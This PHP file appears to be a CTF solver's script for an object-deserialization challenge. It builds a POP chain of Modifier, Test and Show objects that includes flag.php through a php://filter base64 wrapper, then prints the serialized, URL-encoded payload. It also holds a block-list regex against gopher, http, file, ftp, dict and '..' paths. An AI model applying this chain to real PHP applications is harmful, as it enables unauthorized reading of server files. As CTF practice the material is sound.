Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function __construct(){
        $this->var = "php://filter/read=convert.base64-encode/resource=flag.php";
    }
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
        $this->p = new Modifier();
    }

    public function __get($key){
        echo "1"."\n";
        $function = $this->p;
        return $function();
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php',$b=TRUE){
        $this->source = $file;
        $this->str = new Test();
        if($b===TRUE){
            echo "1234\n";
            $this->source = new Show($file,FALSE);
            
        }
        var_dump($this->str);
        // echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        echo "tostring\n";
        var_dump($this->str);
        return $this->str->source;
    }

    public function __wakeup(){
        var_dump($this->str);
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
        echo "2\n";
    }
}

$a = new Show();
echo serialize($a)."\n";
echo urlencode(serialize($a))."\n";
unserialize(serialize($a));